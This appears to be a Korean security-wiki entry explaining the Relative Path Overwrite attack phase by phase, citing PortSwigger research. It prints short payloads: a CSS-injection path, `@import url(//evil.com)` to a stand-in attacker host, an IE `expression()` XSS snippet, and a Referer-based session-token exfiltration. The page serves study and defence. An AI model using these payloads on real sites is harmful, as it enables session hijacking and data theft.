---
title: Relative Path Overwrite Attack
description: 
published: true
date: 2025-07-31T13:58:44.429Z
tags: credential harvesting, relative path discovery, path resolution divergence, quirks mode forcing, visual confirmation via css injection, arbitrary css execution, cross‑site scripting (xss)
editor: markdown
dateCreated: 2025-07-25T10:21:25.470Z
---

# Relative Path Overwrite Attack

## 개요

“Relative Path Overwrite Attack”은 HTML 문서에서 참조되는 상대 경로 자원(예: CSS, JS 등)의 해석 기준이 브라우저와 서버 사이에서 불일치하는 점을 악용한다. 공격자는 요청 경로를 조작해 상대 경로의 base path가 의도한 것과 달라지도록 유도하고, 서버가 이 조작된 경로에 대해 HTML 문서를 반환하도록 만들어 브라우저가 해당 문서를 스타일시트 등으로 잘못 해석하게 만든다. 이는 리소스를 식별하는 상대 경로에 대한 해석 기준이 구성 요소마다 달라 발생하며, 결과적으로 CSS 인젝션, 정보 유출, 스크립트 실행으로 이어질 수 있다.

## 분류

> 메타데이터 해석 불일치 (Metadata Interpretation Gap)
> → 리소스 식별자 해석 불일치 (Resource Identifier Mismatch)
> → Relative Path Overwrite Attack

## 절차

| Phase          | Description                                                                                                                                                                |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Reconnaissance | 웹 앱 안에서 href="styles/…"처럼 절대 경로(/로 시작)가 아닌 링크를 수집한다. Burp Suite의 Passive Scanner나 수동 탐색으로 후보 URL을 목록화한다.                                                                   |
| Divergence     | 취약한 URL 뒤에 가짜 디렉터리를 붙인다. 예를 들어 /viewforum.php/abc/def?f=2 에서 브라우저는  abc 아래의 'def'라는 파일로 착각하지만 서버는 여전히 /viewforum.php를 실행해서 원본 HTML을 돌려준다.                                  |
| Obfuscation    | 브라우저가 HTML을 CSS로 가져올 수 있게 한다. 이미 구식 DOCTYPE이면 그대로 이용하나, 최신 DOCTYPE이면 페이지를 iframe에 넣고 `<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">`로 IE Quirks Mode를 상속시킨다. |
| Validation     | 경로에 URL 인코딩된 줄바꿈과 CSS를 삽입한다. 예를 들어 `/search.php/%0A{}*{color:red;}///`를 삽입했을 때 iframe 안 텍스트가 빨갛게 바뀐다면 공격의 성공을 검증할 수 있다.                                                    |
| Exploitation   | 테스트 CSS를 교체해서 공격을 확장한다. `@import url(//evil.com);`, IE `expression()` 등으로 세션 토큰·CSRF 토큰을 추출한다.                                                                             |
| Exfiltration   | `@import` 요청이 보내는 Referer 헤더에 세션 ID가 포함되도록 유도해 외부 서버에서 수집하거나 `expression()`이 추출한 값을 URL 매개변수(GET 파라미터)에 실어 외부 서버로 전송하도록 한다.                                                |

<div style="text-align: left;">
  <img
    src="/relative_path_overwrite_attack.png"
    alt="Relative Path Overwrite Attack 다이어그램"
    width="1000"
    style="display: block;
           margin: 0 0 1em 0;
           height: auto;"
  />
</div>

## 공격기법

### Reconnaissance

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Relative Path Discovery</td>
      <td>
        <pre><code>&lt;link href="styles/theme/print.css"&gt;</code></pre>
      </td>
      <td>웹 애플리케이션 내에서 슬래시(/)로 시작하지 않는 상대 경로를 사용하여 로드되는 CSS나 JS 파일을 수집한다. 이를 통해 경로 조작에 영향을 받을 수 있는 잠재적 취약 지점을 식별한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Divergence

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Path Resolution Divergence</td>
      <td>
        <pre><code>viewforum.php/anything/here</code></pre>
      </td>
      <td>서버는 viewforum.php를 실행하지만, 브라우저는 경로를 `/viewforum.php/anything/`으로 잘못 해석하게 만드는 가짜 디렉터리를 URL에 추가한다. 이로 인해 브라우저가 상대 경로의 기준(base path)을 잘못 계산하여, HTML 페이지를 CSS로 요청하게 만드는 해석 불일치를 유발한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Obfuscation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Quirks Mode Forcing</td>
      <td>
        <pre><code>&lt;meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7"&gt;</code></pre>
      </td>
      <td>브라우저가 Content-Type: text/html 헤더를 무시하고 HTML 문서를 CSS로 파싱하도록 만들기 위해, 취약한 페이지를 iframe에 삽입하고 메타 태그를 이용해 IE7 호환 모드(Quirks Mode)를 강제로 활성화시킨다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Validation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Visual Confirmation via CSS Injection</td>
      <td>
        <pre><code>/search.php/%0A{}*{color:red;}///</code></pre>
      </td>
      <td>URL 경로에 간단한 CSS 페이로드를 주입하여, iframe으로 로드된 페이지의 특정 요소(예: 전체 텍스트)가 빨간색으로 변하는지 시각적으로 확인한다. 이를 통해 공격이 성공적으로 작동하는지 검증할 수 있다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Exploitation

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Arbitrary CSS Execution</td>
      <td>
        <pre><code>@import url(//evil.com);</code></pre>
      </td>
      <td>검증된 CSS 인젝션 지점을 이용해, 공격자가 제어하는 외부 서버의 스타일시트를 `@import` 구문으로 로드한다. 이를 통해 피해자의 브라우저에서 임의의 CSS를 실행하여 정보 탈취의 발판을 마련한다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>JavaScript Execution via Expression</td>
      <td>
        <pre><code>expression(alert('XSS'))</code></pre>
      </td>
      <td>구형 IE 브라우저를 대상으로, CSS의 `expression()` 함수를 이용해 임의의 JavaScript 코드를 실행시켜 단순 정보 유출을 넘어 XSS 공격으로 확장시킨다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Exfiltration

<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Session Token Exfiltration via Referer</td>
      <td>
        <pre><code>adm/index.php/%0C{}@import...</code></pre>
      </td>
      <td>로그인 시 세션 ID(sid)가 URL 파라미터에 노출되는 페이지를 공격 대상으로 삼는다. 조작된 경로에서 외부 CSS를 `@import` 하도록 유도하면, 브라우저는 Referer 헤더에 세션 ID가 포함된 전체 URL을 담아 요청하게 되어 세션 토큰이 외부 서버로 유출된다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

## 분류에 해당하는 문서

* \[1] [https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities](https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities)

## 기타 참고문헌
